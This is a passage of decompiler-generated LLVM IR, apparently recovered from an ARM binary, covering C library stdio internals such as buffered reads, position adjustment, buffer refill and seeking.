  %v1_1a83c = inttoptr i32 %v0_1a83c to i16*
  %v2_1a83c = load i16, i16* %v1_1a83c, align 2
  %v1_1a840 = add i32 %v0_1a83c, 8
  %v2_1a840 = inttoptr i32 %v1_1a840 to i32*
  %v3_1a840 = load i32, i32* %v2_1a840, align 4
  store i32 %v3_1a840, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1a848 = and i16 %v2_1a83c, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_1a848, i16* %v1_1a83c, align 2
  %v0_1a854 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a854 = load i32, i32* @r5, align 4
  %v2_1a854 = add i32 %v1_1a854, 28
  %v3_1a854 = inttoptr i32 %v2_1a854 to i32*
  store i32 %v0_1a854, i32* %v3_1a854, align 4
  %v0_1a858 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a858 = trunc i32 %v0_1a858 to i8
  %v2_1a858 = load i32, i32* @r5, align 4
  %v3_1a858 = add i32 %v2_1a858, 2
  %v4_1a858 = inttoptr i32 %v3_1a858 to i8*
  store i8 %v1_1a858, i8* %v4_1a858, align 1
  %v0_1a85c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a85c = load i32, i32* @r5, align 4
  %v2_1a85c = add i32 %v1_1a85c, 16
  %v3_1a85c = inttoptr i32 %v2_1a85c to i32*
  store i32 %v0_1a85c, i32* %v3_1a85c, align 4
  %v0_1a860 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a860 = load i32, i32* @r5, align 4
  %v2_1a860 = add i32 %v1_1a860, 20
  %v3_1a860 = inttoptr i32 %v2_1a860 to i32*
  store i32 %v0_1a860, i32* %v3_1a860, align 4
  %v0_1a864 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a864 = load i32, i32* @r5, align 4
  %v2_1a864 = add i32 %v1_1a864, 24
  %v3_1a864 = inttoptr i32 %v2_1a864 to i32*
  store i32 %v0_1a864, i32* %v3_1a864, align 4
  %v0_1a868 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a868 = load i32, i32* @r5, align 4
  %v2_1a868 = add i32 %v1_1a868, 44
  %v3_1a868 = inttoptr i32 %v2_1a868 to i32*
  store i32 %v0_1a868, i32* %v3_1a868, align 4
  br label %dec_label_pc_1a874

dec_label_pc_1a870:                               ; preds = %dec_label_pc_1a7f8, %dec_label_pc_1a824, %dec_label_pc_1a810
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a874

dec_label_pc_1a874:                               ; preds = %dec_label_pc_1a83c, %dec_label_pc_1a870
  %v0_1a874 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a874 = icmp eq i32 %v0_1a874, 0
  br i1 %v2_1a874, label %dec_label_pc_1a874..thread8_crit_edge, label %bb20

dec_label_pc_1a874..thread8_crit_edge:            ; preds = %dec_label_pc_1a874
  %v0_1a88c.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_1a874
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1a884 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a884 = add i32 %v1_1a884, 28
  %v4_1a884 = inttoptr i32 %v3_1a884 to i32*
  %v5_1a884 = load i32, i32* %v4_1a884, align 4
  store i32 %v5_1a884, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a874..thread8_crit_edge, %bb20
  %v0_1a88c = phi i32 [ %v0_1a88c.pre, %dec_label_pc_1a874..thread8_crit_edge ], [ %v5_1a884, %bb20 ]
  %v2_1a88c = xor i1 %v2_1a874, true
  call void @__pseudo_cond_branch(i1 %v2_1a88c, i32 %v0_1a88c)
  br label %dec_label_pc_1a890

dec_label_pc_1a890:                               ; preds = %dec_label_pc_1a78c, %.thread8
  %v0_1a890 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1a764, i32* @r4, align 4
  store i32 %v6_1a764, i32* @r5, align 4
  store i32 %v12_1a764, i32* @r7, align 4
  ret i32 %v0_1a890

; uselistorder directives
  uselistorder i32 %v0_1a824, { 1, 0 }
  uselistorder i32 %v3_1a7a0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 19, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 56, { 18, 20, 10, 11, 12, 13, 19, 9, 0, 2, 21, 3, 5, 4, 6, 15, 22, 16, 17, 14, 1, 23, 7, 24, 8 }
  uselistorder label %dec_label_pc_1a890, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a874, { 1, 0 }
  uselistorder label %dec_label_pc_1a870, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a824, { 1, 0 }
  uselistorder label %dec_label_pc_1a7ec, { 2, 1, 0 }
}

define i32 @function_1a8a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a8a4:
  %v0_1a8a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a8a4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1a8a4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a8a4, %bb
  %v10_1a8b0 = phi i32 [ %arg1, %dec_label_pc_1a8a4 ], [ 0, %bb ]
  ret i32 %v10_1a8b0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a8b4 = load i32, i32* @r4, align 4
  store i32 %v3_1a8b4, i32* %stack_var_-12, align 4
  %v0_1a8b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a8b8 = inttoptr i32 %v0_1a8b8 to i16*
  %v2_1a8b8 = load i16, i16* %v1_1a8b8, align 2
  %v3_1a8b8 = zext i16 %v2_1a8b8 to i32
  %v1_1a8bc = and i32 %v3_1a8b8, 4
  store i32 %v1_1a8bc, i32* %r5.global-to-local, align 4
  %v2_1a8bc = icmp eq i32 %v1_1a8bc, 0
  store i32 %v0_1a8b8, i32* %r4.global-to-local, align 4
  br i1 %v2_1a8bc, label %dec_label_pc_1a8d0, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1a8d0:                               ; preds = %entry
  %v1_1a8d0 = icmp slt i32 %arg2, 0
  br i1 %v1_1a8d0, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1a8d0
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1a8d0, %bb18
  %v1_1a8d8 = add i32 %v0_1a8b8, 4
  %v2_1a8d8 = inttoptr i32 %v1_1a8d8 to i32*
  %v3_1a8d8 = load i32, i32* %v2_1a8d8, align 4
  store i32 %v3_1a8d8, i32* %r0.global-to-local, align 4
  %v1_1a8dc = call i32 @__GI_read(i32 %v3_1a8d8)
  store i32 %v1_1a8dc, i32* %r0.global-to-local, align 4
  %v5_1a8e4 = icmp sgt i32 %v1_1a8dc, 0
  br i1 %v5_1a8e4, label %.thread7, label %dec_label_pc_1a8e8

dec_label_pc_1a8e8:                               ; preds = %bb19
  %v2_1a8e0 = icmp eq i32 %v1_1a8dc, 0
  %v0_1a8e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a8e8 = inttoptr i32 %v0_1a8e8 to i16*
  %v2_1a8e8 = load i16, i16* %v1_1a8e8, align 2
  br i1 %v2_1a8e0, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1a8e8
  %v2_1a8ec = or i16 %v2_1a8e8, 4
  store i16 %v2_1a8ec, i16* %v1_1a8e8, align 2
  %v1_1a908.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1a8e8
  %v2_1a8f0 = or i16 %v2_1a8e8, 8
  store i16 %v2_1a8f0, i16* %v1_1a8e8, align 2
  %v1_1a8fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1a8fc, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1a908 = phi i32 [ %v1_1a908.pre, %bb20 ], [ 0, %bb ], [ %v1_1a8dc, %bb19 ], [ %v1_1a8fc, %bb21 ]
  %v2_1a904 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a904, i32* @r4, align 4
  ret i32 %v1_1a908

; uselistorder directives
  uselistorder i16 %v2_1a8e8, { 1, 0 }
  uselistorder i32 %v1_1a8dc, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a90c = load i32, i32* @r4, align 4
  store i32 %v3_1a90c, i32* %stack_var_-12, align 4
  %v3_1a910 = load i16, i16* %arg1, align 2
  %v4_1a910 = zext i16 %v3_1a910 to i32
  store i32 %v4_1a910, i32* @ip, align 4
  %tmp17 = urem i16 %v3_1a910, 4
  %v1_1a914 = zext i16 %tmp17 to i32
  store i32 %v1_1a914, i32* %r2.global-to-local, align 4
  %v2_1a914 = icmp eq i16 %tmp17, 0
  br i1 %v2_1a914, label %bb, label %dec_label_pc_1a928

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_1a928:                               ; preds = %entry
  %v1_1a928 = add nsw i32 %v1_1a914, -1
  %v7_1a928 = icmp eq i16 %tmp17, 1
  br i1 %v7_1a928, label %bb14, label %dec_label_pc_1a930

dec_label_pc_1a930:                               ; preds = %dec_label_pc_1a928
  %v1_1a930 = and i32 %v4_1a910, 2048
  %v2_1a930 = icmp eq i32 %v1_1a930, 0
  br i1 %v2_1a930, label %bb14, label %dec_label_pc_1a938

dec_label_pc_1a938:                               ; preds = %dec_label_pc_1a930
  %v7_1a938 = icmp eq i32 %v1_1a928, 2
  br i1 %v7_1a938, label %dec_label_pc_1a9bc, label %dec_label_pc_1a940

dec_label_pc_1a940:                               ; preds = %dec_label_pc_1a938
  %v2_1a940 = add i32 %tmp, 40
  %v3_1a940 = inttoptr i32 %v2_1a940 to i32*
  %v4_1a940 = load i32, i32* %v3_1a940, align 4
  store i32 %v4_1a940, i32* %r3.global-to-local, align 4
  %v2_1a944 = icmp eq i32 %v4_1a940, 0
  br i1 %v2_1a944, label %dec_label_pc_1a94c, label %dec_label_pc_1a9bc

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a940
  %v2_1a94c = add i32 %tmp, 44
  %v3_1a94c = inttoptr i32 %v2_1a94c to i32*
  %v4_1a94c = load i32, i32* %v3_1a94c, align 4
  store i32 %v4_1a94c, i32* %r3.global-to-local, align 4
  %v2_1a950 = add i32 %tmp, 3
  %v3_1a950 = inttoptr i32 %v2_1a950 to i8*
  %v4_1a950 = load i8, i8* %v3_1a950, align 1
  %v5_1a950 = zext i8 %v4_1a950 to i32
  store i32 %v5_1a950, i32* %r2.global-to-local, align 4
  %v2_1a954 = icmp eq i32 %v4_1a94c, 0
  br i1 %v2_1a954, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1a94c
  %v1_1a95c3 = sub nsw i32 0, %v5_1a950
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1a94c
  %v3_1a958 = add i32 %tmp, 2
  %v4_1a958 = inttoptr i32 %v3_1a958 to i8*
  %v5_1a958 = load i8, i8* %v4_1a958, align 1
  %v6_1a958 = zext i8 %v5_1a958 to i32
  store i32 %v6_1a958, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1a958, %v5_1a950
  %v3_1a960 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_1a930, %dec_label_pc_1a928, %bb13
  %v1_1a974 = phi i32 [ %v1_1a95c3, %.thread1 ], [ %v1_1a928, %dec_label_pc_1a930 ], [ %v1_1a928, %dec_label_pc_1a928 ], [ 0, %bb ], [ %v3_1a960, %bb13 ]
  %v1_1a964 = and i32 %v4_1a910, 64
  %v2_1a964 = icmp eq i32 %v1_1a964, 0
  %v2_1a968 = add i32 %tmp, 16
  %v3_1a968 = inttoptr i32 %v2_1a968 to i32*
  %v4_1a968 = load i32, i32* %v3_1a968, align 4
  store i32 %v4_1a968, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1a964, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1a974 = sub i32 %v1_1a974, %v4_1a968
  store i32 %v2_1a974, i32* %r3.global-to-local, align 4
  %v1_1a978 = inttoptr i32 %arg2 to i32*
  %v2_1a978 = load i32, i32* %v1_1a978, align 4
  store i32 %v2_1a978, i32* %r0.global-to-local, align 4
  %v3_1a978 = add i32 %arg2, 4
  %v4_1a978 = inttoptr i32 %v3_1a978 to i32*
  %v5_1a978 = load i32, i32* %v4_1a978, align 4
  %v2_1a97c = add i32 %storemerge, %v2_1a974
  store i32 %v2_1a97c, i32* %r4.global-to-local, align 4
  %v2_1a980 = sub i32 %v2_1a978, %v2_1a97c
  store i32 %v2_1a980, i32* %r2.global-to-local, align 4
  %v2_1a984 = and i32 %v2_1a97c, 1073741824
  %v3_1a984 = icmp ne i32 %v2_1a984, 0
  %v4_1a984 = ashr i32 %v2_1a97c, 31
  %v6_1a984 = icmp eq i1 %v3_1a984, false
  %v7_1a984 = sub i32 %v5_1a978, %v4_1a984
  %v9_1a984 = sext i1 %v6_1a984 to i32
  %v10_1a984 = add i32 %v7_1a984, %v9_1a984
  store i32 %v10_1a984, i32* %r3.global-to-local, align 4
  %v2_1a988 = sub i32 %v10_1a984, %v5_1a978
  %v4_1a988 = xor i32 %v10_1a984, %v5_1a978
  %v5_1a988 = xor i32 %v2_1a988, %v10_1a984
  %v6_1a988 = and i32 %v5_1a988, %v4_1a988
  %v7_1a988 = icmp slt i32 %v6_1a988, 0
  %v8_1a988 = icmp slt i32 %v2_1a988, 0
  %v9_1a988 = icmp eq i32 %v10_1a984, %v5_1a978
  store i32 %v2_1a980, i32* %v1_1a978, align 4
  %v5_1a98c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1a98c, i32* %v4_1a978, align 4
  %v3_1a990 = xor i1 %v8_1a988, %v7_1a988
  %v4_1a990 = or i1 %v9_1a988, %v3_1a990
  br i1 %v4_1a990, label %dec_label_pc_1a994, label %dec_label_pc_1a9a0

dec_label_pc_1a994:                               ; preds = %bb14
  br i1 %v9_1a988, label %dec_label_pc_1a998, label %dec_label_pc_1a9a4thread-pre-split

dec_label_pc_1a998:                               ; preds = %dec_label_pc_1a994
  %v0_1a998 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a998 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_1a998, %v1_1a998
  br i1 %tmp18, label %dec_label_pc_1a9a0, label %dec_label_pc_1a9a4thread-pre-split

dec_label_pc_1a9a0:                               ; preds = %dec_label_pc_1a998, %bb14
  %v0_1a9a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a9a0 = sub i32 0, %v0_1a9a0
  store i32 %v1_1a9a0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a9a4

dec_label_pc_1a9a4thread-pre-split:               ; preds = %dec_label_pc_1a998, %dec_label_pc_1a994
  %v0_1a9a4.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a9a4

dec_label_pc_1a9a4:                               ; preds = %dec_label_pc_1a9a4thread-pre-split, %dec_label_pc_1a9a0
  %v0_1a9a4 = phi i32 [ %v0_1a9a4.pr, %dec_label_pc_1a9a4thread-pre-split ], [ %v1_1a9a0, %dec_label_pc_1a9a0 ]
  %v1_1a9a4 = icmp slt i32 %v0_1a9a4, 0
  br i1 %v1_1a9a4, label %dec_label_pc_1a9ac, label %dec_label_pc_1a9c0

dec_label_pc_1a9ac:                               ; preds = %dec_label_pc_1a9a4
  %v0_1a9ac = call i32 @__GI___errno_location()
  store i32 %v0_1a9ac, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1a9b4 = inttoptr i32 %v0_1a9ac to i32*
  store i32 75, i32* %v2_1a9b4, align 4
  %v0_1a9c0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a9c0

dec_label_pc_1a9bc:                               ; preds = %dec_label_pc_1a940, %dec_label_pc_1a938
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a9c0

dec_label_pc_1a9c0:                               ; preds = %dec_label_pc_1a9a4, %dec_label_pc_1a9ac, %dec_label_pc_1a9bc
  %v0_1a9c0 = phi i32 [ %v0_1a9a4, %dec_label_pc_1a9a4 ], [ %v0_1a9c0.pre, %dec_label_pc_1a9ac ], [ -1, %dec_label_pc_1a9bc ]
  store i32 %v0_1a9c0, i32* %r0.global-to-local, align 4
  %v2_1a9c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a9c8, i32* @r4, align 4
  ret i32 %v0_1a9c0

; uselistorder directives
  uselistorder i32 %v0_1a9c0, { 1, 0 }
  uselistorder i1 %v9_1a988, { 1, 0 }
  uselistorder i32 %v2_1a988, { 1, 0 }
  uselistorder i32 %v10_1a984, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1a978, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1a9c0, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a9d0 = load i32, i32* @r4, align 4
  store i32 %v3_1a9d0, i32* %stack_var_-8, align 4
  %v1_1a9d4 = add i32 %arg1, 8
  %v1_1a9d8 = inttoptr i32 %v1_1a9d4 to i32*
  %v2_1a9d8 = load i32, i32* %v1_1a9d8, align 4
  %v3_1a9d8 = add i32 %arg1, 12
  %v4_1a9d8 = inttoptr i32 %v3_1a9d8 to i32*
  %v5_1a9d8 = load i32, i32* %v4_1a9d8, align 4
  %v2_1a9dc = sub i32 %v5_1a9d8, %v2_1a9d8
  store i32 %v2_1a9dc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1a9e4 = inttoptr i32 %arg1 to i16*
  %v4_1a9e4 = call i32 @__stdio_READ(i16* %v3_1a9e4, i32 %v2_1a9d8, i32 %v2_1a9dc)
  %v0_1a9e8 = load i32, i32* @r4, align 4
  %v1_1a9e8 = add i32 %v0_1a9e8, 8
  %v2_1a9e8 = inttoptr i32 %v1_1a9e8 to i32*
  %v3_1a9e8 = load i32, i32* %v2_1a9e8, align 4
  store i32 %v3_1a9e8, i32* %r2.global-to-local, align 4
  %v2_1a9ec = add i32 %v3_1a9e8, %v4_1a9e4
  %v2_1a9f0 = add i32 %v0_1a9e8, 20
  %v3_1a9f0 = inttoptr i32 %v2_1a9f0 to i32*
  store i32 %v2_1a9ec, i32* %v3_1a9f0, align 4
  %v0_1a9f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9f4 = load i32, i32* @r4, align 4
  %v2_1a9f4 = add i32 %v1_1a9f4, 16
  %v3_1a9f4 = inttoptr i32 %v2_1a9f4 to i32*
  store i32 %v0_1a9f4, i32* %v3_1a9f4, align 4
  %v2_1a9f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a9f8, i32* @r4, align 4
  ret i32 %v4_1a9e4

; uselistorder directives
  uselistorder i32 %v4_1a9e4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1aa00 = load i32, i32* @r4, align 4
  store i32 %v3_1aa00, i32* %stack_var_-12, align 4
  %v0_1aa04 = load i32, i32* @r0, align 4
  %v1_1aa04 = inttoptr i32 %v0_1aa04 to i16*
  %v2_1aa04 = load i16, i16* %v1_1aa04, align 2
  %v3_1aa04 = zext i16 %v2_1aa04 to i32
  store i32 %v3_1aa04, i32* %r3.global-to-local, align 4
  %v0_1aa08 = load i32, i32* @r1, align 4
  %v2_1aa08 = and i32 %v0_1aa08, %v3_1aa04
  %v4_1aa08 = icmp eq i32 %v2_1aa08, 0
  store i32 %v0_1aa04, i32* @r4, align 4
  br i1 %v4_1aa08, label %dec_label_pc_1aa18, label %dec_label_pc_1aa28

dec_label_pc_1aa18:                               ; preds = %entry
  %v1_1aa18 = and i32 %v3_1aa04, 2176
  %v2_1aa18 = icmp eq i32 %v1_1aa18, 0
  br i1 %v2_1aa18, label %dec_label_pc_1aa20, label %dec_label_pc_1aa34

dec_label_pc_1aa20:                               ; preds = %dec_label_pc_1aa18
  %v2_1aa20 = or i32 %v0_1aa08, %v3_1aa04
  store i32 %v2_1aa20, i32* %r3.global-to-local, align 4
  %v1_1aa24 = trunc i32 %v2_1aa20 to i16
  store i16 %v1_1aa24, i16* %v1_1aa04, align 2
  %v0_1aa28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1aa28

dec_label_pc_1aa28:                               ; preds = %entry, %dec_label_pc_1aa20
  %v0_1aa28 = phi i32 [ %v0_1aa04, %entry ], [ %v0_1aa28.pre, %dec_label_pc_1aa20 ]
  %v1_1aa28 = inttoptr i32 %v0_1aa28 to i16*
  %v2_1aa28 = load i16, i16* %v1_1aa28, align 2
  %v3_1aa28 = zext i16 %v2_1aa28 to i32
  store i32 %v3_1aa28, i32* %r3.global-to-local, align 4
  %v1_1aa2c = and i32 %v3_1aa28, 16
  store i32 %v1_1aa2c, i32* %r5.global-to-local, align 4
  %v2_1aa2c = icmp eq i32 %v1_1aa2c, 0
  br i1 %v2_1aa2c, label %dec_label_pc_1aa54, label %dec_label_pc_1aa34

dec_label_pc_1aa34:                               ; preds = %dec_label_pc_1aa18, %dec_label_pc_1aa28
  %v0_1aa34 = call i32 @__GI___errno_location()
  store i32 %v0_1aa34, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1aa3c = inttoptr i32 %v0_1aa34 to i32*
  store i32 9, i32* %v2_1aa3c, align 4
  br label %dec_label_pc_1aa40

dec_label_pc_1aa40:                               ; preds = %dec_label_pc_1aa5c, %dec_label_pc_1aa34
  %v0_1aa40 = load i32, i32* @r4, align 4
  %v1_1aa40 = inttoptr i32 %v0_1aa40 to i16*
  %v2_1aa40 = load i16, i16* %v1_1aa40, align 2
  %v3_1aa40 = zext i16 %v2_1aa40 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1aa48 = or i32 %v3_1aa40, 8
  store i32 %v1_1aa48, i32* %r3.global-to-local, align 4
  %v1_1aa4c = trunc i32 %v1_1aa48 to i16
  store i16 %v1_1aa4c, i16* %v1_1aa40, align 2
  %v1_1aa94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aa8c

dec_label_pc_1aa54:                               ; preds = %dec_label_pc_1aa28
  %v1_1aa54 = and i32 %v3_1aa28, 64
  %v2_1aa54 = icmp eq i32 %v1_1aa54, 0
  br i1 %v2_1aa54, label %dec_label_pc_1aa7c, label %dec_label_pc_1aa5c

dec_label_pc_1aa5c:                               ; preds = %dec_label_pc_1aa54
  %v0_1aa5c = call i32 @__stdio_wcommit()
  store i32 %v0_1aa5c, i32* %r0.global-to-local, align 4
  %v2_1aa60 = icmp eq i32 %v0_1aa5c, 0
  br i1 %v2_1aa60, label %dec_label_pc_1aa68, label %dec_label_pc_1aa40

dec_label_pc_1aa68:                               ; preds = %dec_label_pc_1aa5c
  %v0_1aa68 = load i32, i32* @r4, align 4
  %v1_1aa68 = inttoptr i32 %v0_1aa68 to i16*
  %v2_1aa68 = load i16, i16* %v1_1aa68, align 2
  %v3_1aa68 = zext i16 %v2_1aa68 to i32
  store i32 %v3_1aa68, i32* %r3.global-to-local, align 4
  %v1_1aa6c = add i32 %v0_1aa68, 8
  %v2_1aa6c = inttoptr i32 %v1_1aa6c to i32*
  %v3_1aa6c = load i32, i32* %v2_1aa6c, align 4
  %v1_1aa70 = and i32 %v3_1aa68, 65471
  store i32 %v1_1aa70, i32* %r3.global-to-local, align 4
  %v2_1aa74 = add i32 %v0_1aa68, 28
  %v3_1aa74 = inttoptr i32 %v2_1aa74 to i32*
  store i32 %v3_1aa6c, i32* %v3_1aa74, align 4
  %v0_1aa78 = load i32, i32* %r3.global-to-local, align 4
  %v1_1aa78 = trunc i32 %v0_1aa78 to i16
  %v2_1aa78 = load i32, i32* @r4, align 4
  %v3_1aa78 = inttoptr i32 %v2_1aa78 to i16*
  store i16 %v1_1aa78, i16* %v3_1aa78, align 2
  %v0_1aa7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1aa7c

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aa54, %dec_label_pc_1aa68
  %v2_1aa84 = phi i32 [ %v0_1aa28, %dec_label_pc_1aa54 ], [ %v0_1aa7c.pre, %dec_label_pc_1aa68 ]
  %v1_1aa7c = inttoptr i32 %v2_1aa84 to i16*
  %v2_1aa7c = load i16, i16* %v1_1aa7c, align 2
  %v3_1aa7c = zext i16 %v2_1aa7c to i32
  %v1_1aa80 = or i32 %v3_1aa7c, 1
  store i32 %v1_1aa80, i32* %r3.global-to-local, align 4
  %v1_1aa84 = trunc i32 %v1_1aa80 to i16
  store i16 %v1_1aa84, i16* %v1_1aa7c, align 2
  %v0_1aa88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1aa88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aa8c

dec_label_pc_1aa8c:                               ; preds = %dec_label_pc_1aa40, %dec_label_pc_1aa7c
  %v1_1aa94 = phi i32 [ %v1_1aa94.pre, %dec_label_pc_1aa40 ], [ %v0_1aa88, %dec_label_pc_1aa7c ]
  %v2_1aa90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1aa90, i32* @r4, align 4
  ret i32 %v1_1aa94

; uselistorder directives
  uselistorder i32 %v3_1aa04, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1aa8c, { 1, 0 }
  uselistorder label %dec_label_pc_1aa7c, { 1, 0 }
  uselistorder label %dec_label_pc_1aa34, { 1, 0 }
  uselistorder label %dec_label_pc_1aa28, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1aaa4 = load i32, i32* %arg2, align 4
  %v3_1aaa4 = add i32 %tmp, 4
  %v4_1aaa4 = inttoptr i32 %v3_1aaa4 to i32*
  %v5_1aaa4 = load i32, i32* %v4_1aaa4, align 4
  %v1_1aaa8 = add i32 %arg1, 4
  %v2_1aaa8 = inttoptr i32 %v1_1aaa8 to i32*
  %v3_1aaa8 = load i32, i32* %v2_1aaa8, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1aab0 = call i32 @__GI_lseek64(i32 %v3_1aaa8, i32 %tmp, i32 %v2_1aaa4, i32 %v5_1aaa4)
  %v1_1aab4 = icmp slt i32* %arg2, null
  br i1 %v1_1aab4, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1aabc5 = load i32, i32* @r4, align 4
  %v4_1aabc6 = inttoptr i32 %v3_1aabc5 to i32*
  store i32 %v4_1aab0, i32* %v4_1aabc6, align 4
  %v6_1aabc7 = add i32 %v3_1aabc5, 4
  %v7_1aabc8 = inttoptr i32 %v6_1aabc7 to i32*
  store i32 %tmp, i32* %v7_1aabc8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1aab0, %entry ]
  ret i32 %storemerge
